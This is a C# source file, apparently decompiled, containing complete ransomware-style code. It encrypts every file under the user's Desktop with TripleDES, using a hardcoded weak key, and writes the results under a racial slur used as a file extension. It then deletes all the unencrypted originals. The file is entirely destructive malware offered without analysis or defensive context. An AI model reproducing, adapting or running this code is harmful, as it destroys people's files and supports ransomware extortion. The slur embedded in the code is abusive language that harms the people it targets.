using System;
using System.IO;
using System.Security.Cryptography;
using Microsoft.VisualBasic.CompilerServices;

public class Form1
{
	public static byte[] Rijndaelcrypt(byte[] File, string Key)
	{
		TripleDESCng tripleDESCng = new TripleDESCng();
		byte[] salt = new byte[10] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Key, salt);
		tripleDESCng.Key = rfc2898DeriveBytes.GetBytes(tripleDESCng.Key.Length);
		tripleDESCng.Mode = CipherMode.ECB;
		tripleDESCng.Padding = PaddingMode.Zeros;
		tripleDESCng.IV = rfc2898DeriveBytes.GetBytes(tripleDESCng.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, tripleDESCng.CreateEncryptor(), CryptoStreamMode.Write);
		byte[] array = File;
		cryptoStream.Write(array, 0, array.Length);
		cryptoStream.Close();
		File = memoryStream.ToArray();
		return File;
	}

	[STAThread]
	public static void Main()
	{
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		File.Delete(Conversions.ToString(Operators.ConcatenateObject(folderPath, (object)"\\desktop.ini")));
		string[] files = Directory.GetFiles(Conversions.ToString(folderPath), "*.*", SearchOption.AllDirectories);
		foreach (string text in files)
		{
			string key = "12";
			byte[] file = File.ReadAllBytes(text);
			byte[] bytes = Rijndaelcrypt(file, key);
			File.WriteAllBytes(text + ".nigga", bytes);
		}
		string[] files2 = Directory.GetFiles(Conversions.ToString(folderPath), "*.*", SearchOption.AllDirectories);
		foreach (object obj in files2)
		{
			if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj, (Type)null, "Contains", new object[1] { ".nigga" }, (string[])null, (Type[])null, (bool[])null)))
			{
				File.Delete(Conversions.ToString(obj));
			}
		}
	}
}
